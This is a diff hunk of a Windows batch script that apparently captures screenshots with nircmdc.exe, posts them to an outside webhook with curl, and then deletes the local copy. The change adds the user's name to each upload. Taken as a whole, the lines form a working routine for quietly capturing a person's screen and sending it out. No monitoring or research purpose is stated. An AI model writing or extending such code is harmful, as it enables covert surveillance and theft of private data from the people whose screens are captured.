@@ -17,5 +17,5 @@ For /f "tokens=2-4 delims=/ " %%a in ('date /t') do (set mydate=%%c-%%a-%%b)
 For /f "tokens=1-2 delims=/:" %%a in ('time /t') do (set mytime=%%a%%b)
 set NAME=%CDIR%\%mydate%_%mytime%.jpg
 %CDIR%\nircmdc.exe savescreenshot "%NAME%" jpg
-curl --ssl-no-revoke -X POST -F "screenshot=@%NAME%" %WEBHOOK%
+curl --ssl-no-revoke -X POST  -F "name=%USER%" -F "screenshot=@%NAME%" %WEBHOOK%
 del %NAME%
